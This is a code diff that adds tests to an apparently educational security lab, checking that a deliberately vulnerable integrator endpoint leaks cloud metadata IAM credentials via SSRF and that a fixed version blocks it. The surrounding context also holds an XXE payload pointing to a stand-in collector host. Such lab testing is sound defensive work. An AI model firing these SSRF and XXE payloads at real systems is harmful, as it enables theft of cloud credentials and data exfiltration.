@@ -134,6 +134,17 @@ class LabTest(unittest.TestCase):
                 '<!DOCTYPE egide [<!ENTITY xxe SYSTEM "http://collector.example/egideoob7a1b2c">]>'
                 '<egide><ping>&xxe;</ping></egide>')
 
+    def test_vulnerable_integrador_reflects_cloud_metadata_credentials(self):
+        url = quote("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
+        status, body, _ = self.call("GET", f"/servicos/vulneravel/integrador?url={url}")
+        self.assertEqual(status, 200)
+        self.assertIn("SecretAccessKey", body)
+
+    def test_fixed_integrador_blocks_cloud_metadata(self):
+        url = quote("http://169.254.169.254/latest/meta-data/")
+        status, body, _ = self.call("GET", f"/servicos/corrigido/integrador?url={url}")
+        self.assertNotIn("SecretAccessKey", body)
+
     def test_vulnerable_import_resolves_an_external_xml_entity(self):
         import lab_services
         with mock.patch.object(lab_services.urllib.request, "urlopen") as fake, \
